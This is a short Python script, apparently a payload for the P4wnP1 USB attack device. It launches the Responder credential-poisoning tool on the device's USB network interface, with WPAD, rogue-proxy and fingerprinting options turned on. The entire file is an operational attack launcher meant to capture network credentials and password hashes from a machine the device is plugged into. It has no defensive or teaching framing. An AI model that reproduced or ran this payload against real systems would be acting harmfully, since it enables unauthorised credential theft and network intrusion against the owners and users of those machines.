# File: /opt/p4wnp1/payloads/network/run_responder.py
import subprocess
import sys
import os

iface = os.environ.get("IFACE", "usb0")
responder_path = "/usr/share/responder/Responder.py"

if not os.path.exists(responder_path):
    print(f"[!] Responder not found at {responder_path}")
    sys.exit(1)

print(f"[*] Starting Responder on {iface}")

cmd = [
    "python3", responder_path,
    "-I", iface,
    "-w", "-r", "-f", "-F"
]

try:
    subprocess.run(cmd)
except KeyboardInterrupt:
    print("[!] Responder interrupted")
    sys.exit(0)
except Exception as e:
    print(f"[!] Error running Responder: {e}")
    sys.exit(2)
